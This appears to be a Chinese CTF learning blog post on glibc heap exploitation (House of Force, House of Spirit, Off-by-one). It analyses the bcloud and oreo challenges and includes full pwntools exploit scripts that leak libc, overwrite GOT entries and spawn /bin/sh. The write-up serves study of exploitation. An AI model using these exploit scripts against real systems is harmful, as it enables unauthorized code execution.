 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102532162.png" alt="image-20210802102532162" style="zoom:80%;">
]]></content>
      <categories>
        <category>PWN学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN学习</tag>
      </tags>
  </entry>
  <entry>
    <title>堆的House Of Force,House of spirit,Off by one 学习</title>
    <url>/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><strong>0x00</strong>:</p>
<pre><code>这其实是接着上个《SploitFun Linux x86 Exploit 开发系列教程》的后续实验，书上关于堆的很多漏洞现在已经不可用或需要特定环境，所以故拿ctf题目继续学习。
</code></pre>
<h1 id="堆的house-of-forcehouse-of-spiritoff-by-one-学习"><a class="markdownIt-Anchor" href="#堆的house-of-forcehouse-of-spiritoff-by-one-学习"></a> 堆的House Of Force,House of spirit,Off by one 学习</h1>
<h2 id="house-of-force"><a class="markdownIt-Anchor" href="#house-of-force"></a> House Of Force</h2>
<h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h3>
<p>House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：</p>
<p>1.能够以溢出等方式控制到 top chunk 的 size 域</p>
<p>2.能够自由地控制堆分配尺寸的大小</p>
<p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)<br></code></pre></td></tr></table></figure>
<p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">remainder   = chunk_at_offset(victim, nb);<br>av-&gt;top    = remainder;<br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br>\<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span><br></code></pre></td></tr></table></figure>
<p>之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p>
<p><strong>与此同时，我们需要注意的是，topchunk</strong> <strong>的 size</strong> <strong>也会更新，其更新的方法如下</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">victim = av-&gt;top;<br>size  = chunksize(victim);<br>remainder_size = size - nb;<br>set_head(remainder, remainder_size | PREV_INUSE);<br></code></pre></td></tr></table></figure>
<p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p>
<h2 id="2016-bctf-bcloud"><a class="markdownIt-Anchor" href="#2016-bctf-bcloud"></a> 2016 BCTF bcloud</h2>
<h3 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析"></a> 程序分析</h3>
<p>检查程序，程序只开启了canary和nx保护</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111002349.png" alt="image-20210802111002349" style="zoom:80%;">
<p>然后用ida分析，程序刚开始会创建一个名字，这里最多读取64个字节的&amp;s，然后创建v2，这里malloc是在读取&amp;s之后的，如果我们输入了64个字节&amp;s后的/x00截断符就会被v2的地址覆盖，strcpy就会把&amp;s和v2的地址复制进去</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111059153.png" alt="image-20210802111059153" style="zoom:80%;">
<p>然后下面的函数就会输出&amp;s就会把v2地址输出</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111114857.png" alt="image-20210802111114857" style="zoom:80%;">
<p>还有一处漏洞在设置org和host处，这里也是和上面一样的漏洞，当输入0x40个&amp;s时，后面v2的值就会把末尾的\x00给覆盖，strcpy就会继续往下复制，而v2分配的最晚，没有堆被free，因此v2分配的堆快是与top chunk相邻的堆快，这里如果复制了0x40个数据，之后的v2的值就会覆盖top chunk的头部的pre_size，之后v3的内容就会先覆盖topchunk的size，这样我们就可以把topchunk的size覆盖成FF FF FF FF，也就是-1。</p>
<img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111139289.png" alt="image-20210802111139289" style="zoom:80%;"> 
<p>New_note函数</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111205577.png" alt="image-20210802111205577" style="zoom:80%;">
<p>这里它不会检查我们输入的长度，就满足了house of force的第二个条件，我们可以自定义分配的堆大小</p>
<p>注意这里在创建堆快时，会把堆快的指针存放在0x804b120处，还有堆快的大小在0x804b0a0处，注意这里malloc的堆快大小是v2+4，也就是我们输入的大小+4</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111222632.png" alt="image-20210802111222632" style="zoom:80%;">
<p>Show选项</p>
<p>这个选项什么都没输出</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111242196.png" alt="image-20210802111242196" style="zoom:80%;">
<p>Edit选项</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111306828.png" alt="image-20210802111306828" style="zoom:80%;">
<p>Delete选项</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111321924.png" alt="image-20210802111321924" style="zoom:80%;">
<p>Syn选项，没有什么用</p>
<p><img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111339035.png" alt="image-20210802111339035"></p>
<h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3>
<ol>
<li>
<p>首先，我们要在输入name的时候输入0x40大小的的参数，然后就会泄露出name创建的内存空间的指针（第一个堆快的指针），利用这个我们可以计算top chunk的位置。</p>
</li>
<li>
<p>然后在输入org以及host的时候，我们先输入0x40个数据，然后v2指针的位置就会覆盖输入数据末尾的/x00截断符，然后strcpy就会继续往下复制，这里v2是后创建的堆快，所以和top chunk相邻，这时候v2的指针覆盖了top chunk的prev_size的部分，v3内容就会覆盖top chunk的size</p>
</li>
</ol>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111407277.png" alt="image-20210802111407277" style="zoom:80%;">
<ol start="3">
<li>我们先把top chunk的size覆盖成FF FF FF FF 这样就可以通过top chunk分配的验证，然后选择new一个chunk，大小为0x804b0a0 -8 - (泄露的第一个堆快地址- 8+ 0x48*3) - 12我们要把top chunk分配到0x804b0a0处，这样就可以控制分配的堆快大小以及位置了。</li>
</ol>
<p>计算方法：泄露的地址-8是因为还有堆头，3个0x48是name+host+org的大小，-12是因为top chunk的堆头+程序中malloc+4，-8是为了让写入的数据刚好在0x804b0a0。</p>
<ol start="4">
<li>
<p>然后我们可以先把free_ got地址劫持为puts_plt的地址，然后调用delete函数泄露atoi的地址，就可以计算libc基址，得到system的地址了。</p>
</li>
<li>
<p>我们得先修改3个堆快的大小为足够大小，然后指针改为atoi_got，free_got，atoi_got，利用puts泄露一个atoi的地址，另外一个用来修改atoi的地址为system_addr，然后在开始调用atoi时输入/bin/sh就可以执行system（/bin/sh）拿到shell</p>
</li>
</ol>
<h3 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> Gdb调试</h3>
<p>开始输入的0x40个a，泄露的第一块堆的地址</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111431784.png" alt="image-20210802111431784" style="zoom:80%;">
<p>开始时输入name，host，org创建的三个堆块，topchunk在org的下方，也就是0xa0090d8处</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111749554.png" alt="image-20210802111749554" style="zoom:80%;">
<p>通过计算偏移，第一次new调用malloc把topchunk分配到了0x804b098处</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111802382.png" alt="image-20210802111802382" style="zoom:80%;">
<p>我们就可以从0x804b0a0处开始修改，先把前三个堆快大小修改为足够大（能修改got表大小即可），然后修改0x804b120处的堆指针为atoi_got，free_got，atoi_got</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111817122.png" alt="image-20210802111817122" style="zoom:80%;">
<p>之后把free_got修改为puts_plt泄露的atoi地址</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111833329.png" alt="image-20210802111833329" style="zoom:80%;">
<h3 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> Payload</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding=UTF-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./bcloud&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./bcloud&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">length, content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Input the length of the note content:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(length))<br>    p.recvuntil(<span class="hljs-string">&quot;Input the content:\n&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>    p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, newcontent</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;id:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;new content:\n&quot;</span>)<br>    p.sendline(newcontent)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;id:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br>name = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x40</span><br>org = <span class="hljs-string">&quot;b&quot;</span> * <span class="hljs-number">0x40</span><br>host = p32(<span class="hljs-number">0xffffffff</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;name:\n&quot;</span>)<br>p.send(name)<br>firstchunk = u32(p.recvuntil(<span class="hljs-string">&quot;! Welcome&quot;</span>)[-<span class="hljs-number">13</span>:-<span class="hljs-number">9</span>])<br>p.recvuntil(<span class="hljs-string">&quot;Org:\n&quot;</span>)<br>p.send(org)<br>p.recvuntil(<span class="hljs-string">&quot;Host:\n&quot;</span>)<br>p.sendline(host)<br><br>length = <span class="hljs-number">0x804b0a0</span> -<span class="hljs-number">8</span> - (firstchunk + <span class="hljs-number">0x48</span>*<span class="hljs-number">3</span> - <span class="hljs-number">8</span>) - <span class="hljs-number">12</span><br>payload=<span class="hljs-string">&#x27;&#x27;</span><br>new(length, payload)<br><br>puts = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>atoi = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>payload =p32(<span class="hljs-number">30</span>)+p32(<span class="hljs-number">30</span>)+p32(<span class="hljs-number">30</span>)+ <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">116</span>+p32(atoi) + p32(free) + p32(atoi)<br><span class="hljs-comment">#覆盖前3个chunk大小为30，足够修改，然后再覆盖0x804b120处的堆指针</span><br>length = <span class="hljs-built_in">len</span>(payload)<br>new(length, payload)<br><span class="hljs-comment">#p.interactive()</span><br>edit(<span class="hljs-number">1</span>, p32(puts))<br>delete(<span class="hljs-number">0</span>)<br><br>atoi_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc_base = atoi_addr - libc.symbols[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;id:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;new content:\n&quot;</span>)<br>p.sendline(p32(system_addr))<br>p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>p.interactive()<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input the length of the note content:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(length))<br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
<h2 id="house-of-spirit"><a class="markdownIt-Anchor" href="#house-of-spirit"></a> House of Spirit</h2>
<h2 id="漏洞原理-2"><a class="markdownIt-Anchor" href="#漏洞原理-2"></a> 漏洞原理</h2>
<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<p>·    fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</p>
<p>·    fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</p>
<p>·    fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</p>
<p>·    fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。</p>
<p>·    fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</p>
<h2 id="2014-hacklu-oreo"><a class="markdownIt-Anchor" href="#2014-hacklu-oreo"></a> 2014 <a href="http://hack.lu">hack.lu</a> oreo</h2>
<h3 id="程序分析-2"><a class="markdownIt-Anchor" href="#程序分析-2"></a> 程序分析</h3>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111929070.png" alt="image-20210802111929070" style="zoom:80%;">
<p>这个程序只开启了nx和canary保护</p>
<p>然后拖入ida进行分析</p>
<p>程序有5个功能</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111947858.png" alt="image-20210802111947858" style="zoom:80%;">
<p>添加功能</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112002731.png" alt="image-20210802112002731" style="zoom:80%;">
<p>这里可以看出来这个分配内存的大致结构了</p>
<p>0 description</p>
<p>0x19 name</p>
<p>0x34 前一个内存的地址</p>
<p>0x38</p>
<p><em>((_DWORD <em>)chunk_addr_dword_804A288 + 13) = v1;，这里是把v1=之前的chunk_addr_dword_804A288（这个地方记录上次分配的内存的地址）处的地址+13</em>4（0x34）的地方赋值成了当前分配的内存的地址，这里DWORD是4字节，所以是chunk_addr_dword_804A288+13</em>4的位置</p>
<p>然后这里读取name的时候存在溢出，这里可以读入56个字节，但是从chunk_addr_dword_804A288+25到+0x38只有31个字节，可以通过溢出覆盖到前一个内存的地址</p>
<p>还有一点是这里每创建一个堆快就会把dword_804A2A4的值加1</p>
<p>show展示功能</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112530269.png" alt="image-20210802112530269" style="zoom:80%;">
<p>从最后一个创建的堆开始，根据堆中的前项指针*((_DWORD *)chunk_addr_dword_804A288 + 13)，依次显示之前创建的堆块。</p>
<p>Order（删除）功能</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112600837.png" alt="image-20210802112600837" style="zoom:80%;">
<p>依次free掉创建的堆快</p>
<p>Leave功能</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112617926.png" alt="image-20210802112617926" style="zoom:80%;">
<p>这里是往804A2A8的地方写入输入的内容，最大128字节，而0x804a2a8这个地方一开始是0x0804a2c0，也就是往0x0804a2c0写入输入的内容</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112643127.png" alt="image-20210802112643127" style="zoom:80%;">
<h3 id="利用思路-2"><a class="markdownIt-Anchor" href="#利用思路-2"></a> 利用思路</h3>
<ol>
<li>
<p>首先我们得泄露出libc的基地址，用来计算system的地址，思路是利用输入name的溢出，把堆的前项指针改成printf函数的got表地址，然后通过show选项，打印出printf的真实地址用来计算libc的基址。</p>
</li>
<li>
<p>之后利用House of Spirit，伪造一个fastbin，然后free后把我们可以分配的内存改到0x804A2A8，因为这个地方存放的是leave功能写入的地址，如果我们能控制这个地方，然后改成我们想要修改的函数的got表地址就可以进行利用</p>
</li>
<li>
<p>伪造fastbin的方法：</p>
</li>
</ol>
<p>首先每创建一个堆快就会把dword_804A2A4的值加1，而这个位置相当于我们在0x804A2A0伪造的chunk的size值，因为我们创建的chunk是0x40大小的，所以我们得先创建0x40个chunk把这里的值改成0x40，因为这里我们伪造的chunk的size位是0x804A2A4。注意这里创建的chunk的每个前项指针得设置成NULL，这样在free的时候就不会把依次free所有的chunk了。</p>
<p>然后还需要绕过一个检查：</p>
<p>·    fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。</p>
<p>这里我们利用leave函数的功能进行绕过，这个选项是在0x0804a2c0处开始修改，得修改伪造的chunk的下一个size位为合适的大小</p>
<ol start="4">
<li>成功free后，我们下一次申请的内存地址就会从 0x0804a2a8开始了，然后把这个地方改为strlen的got表，调用leave选项的函数，这里修改完后就会直接调用strlen函数，相当于system（输入的内容），所以这里要用system的地址+’;bin/sh’，用来拿到shell，用分号是分开调用，这里实际会调用system（system地址）+system（bin/sh）</li>
</ol>
<h2 id="gdb调试-2"><a class="markdownIt-Anchor" href="#gdb调试-2"></a> Gdb调试</h2>
<p>首先创建4个chunk进行实验，可以看到0x0804a2a8的位置存储的是0x0804a2c0，0x0804a2a4位置存储的是4。</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112835587.png" alt="image-20210802112835587" style="zoom:80%;">
<p>查看一个chunk，可以看到和我们猜测的结构一致</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112903550.png" alt="image-20210802112903550" style="zoom:80%;">
<p>使用leave功能，可以看到输入的内容存放在了0x804a2c0的位置</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112917060.png" alt="image-20210802112917060" style="zoom:80%;">
<p>开始时利用name的溢出把第一个申请的chunk的前项指针覆盖成put的got表地址</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802113023666.png" alt="image-20210802113023666" style="zoom:80%;">
<p>创建40个chunk，然后用leave写入0x804a2c0伪造fastbin的内存情况</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802113036589.png" alt="image-20210802113036589" style="zoom:80%;">
<p>Free之后成功把0x804a2a0的内存地址放入了fastbin</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802113049179.png" alt="image-20210802113049179" style="zoom:80%;">
<h3 id="payload脚本"><a class="markdownIt-Anchor" href="#payload脚本"></a> Payload脚本</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding=UTF-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = <span class="hljs-string">&quot;./oreo&quot;</span><br>oreo = ELF(<span class="hljs-string">&quot;./oreo&quot;</span>)<br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(ip, port)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./oreo&quot;</span>)<br>log.info(<span class="hljs-string">&#x27;PID: &#x27;</span> + <span class="hljs-built_in">str</span>(proc.pidof(p)[<span class="hljs-number">0</span>]))<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">descrip, name</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(name)<br>    p.sendline(descrip)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_rifle</span>():</span><br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;===================================\n&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">order</span>():</span><br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span>(<span class="hljs-params">notice</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendline(notice)<br><br>name = <span class="hljs-number">27</span> * <span class="hljs-string">&#x27;a&#x27;</span> + p32(oreo.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(oreo.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>add(<span class="hljs-number">25</span> * <span class="hljs-string">&#x27;a&#x27;</span>, name)<br><span class="hljs-comment">#gdb.attach(p)</span><br>show_rifle()<br>p.recvuntil(<span class="hljs-string">&#x27;===================================\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Description: &#x27;</span>)<br>puts_addr = u32(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:<span class="hljs-number">4</span>])<br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#创建0x40个堆快把0x804A2A4伪造chunk的size值</span><br>chunk = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> chunk &lt; <span class="hljs-number">0x40</span>-<span class="hljs-number">1</span>:<br>    add(<span class="hljs-number">25</span> * <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">27</span> + p32(<span class="hljs-number">0</span>))<br>    chunk += <span class="hljs-number">1</span><br><span class="hljs-comment">#最后一个chunk把上一个chunk地址位置改成0x0804a2a8</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">27</span> + p32(<span class="hljs-number">0x0804a2a8</span>)<br>add(<span class="hljs-number">25</span> * <span class="hljs-string">&#x27;a&#x27;</span>, payload)<br><span class="hljs-comment">#满足伪造fastbin的fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 条件</span><br>payload = <span class="hljs-number">0x20</span> * <span class="hljs-string">&#x27;\x00&#x27;</span> + p32(<span class="hljs-number">0x0</span>) + p32(<span class="hljs-number">0x88</span>)<br>leave(payload)<br>order()<br>p.recvuntil(<span class="hljs-string">&#x27;Okay order submitted!\n&#x27;</span>)<br><br>payload = p32(oreo.got[<span class="hljs-string">&#x27;strlen&#x27;</span>])<br>add(payload, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">20</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>leave(p32(system_addr) + <span class="hljs-string">&#x27;;/bin/sh\x00&#x27;</span>)<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
<h1 id="实验十一-off-by-one-漏洞基于堆"><a class="markdownIt-Anchor" href="#实验十一-off-by-one-漏洞基于堆"></a> 实验十一-Off-By-One 漏洞（基于堆）</h1>
<h2 id="漏洞原理-3"><a class="markdownIt-Anchor" href="#漏洞原理-3"></a> 漏洞原理</h2>
<p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。</p>
<p>off-by-one 利用思路</p>
<p>1.溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p>
